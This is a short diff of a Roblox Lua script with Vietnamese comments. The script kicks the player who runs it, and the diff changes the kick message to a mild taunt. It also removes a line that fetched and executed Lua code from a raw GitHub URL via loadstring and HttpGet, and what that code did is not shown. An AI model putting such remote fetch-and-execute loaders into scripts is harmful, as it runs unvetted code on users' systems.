@@ -6,7 +6,7 @@ local player = Players.LocalPlayer
 local autoKick = true -- đổi thành true nếu muốn kick ngay khi chạy
 
 if autoKick then
-    player:Kick("Update Script")
+    player:Kick("hi con ga ")
 end
 
 -- Hàm safeLoad: load script và chặn lỗi Parent locked
@@ -34,4 +34,4 @@ task.spawn(function()
     end
 end)
 wait(10)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/AYA.lua"))()
+
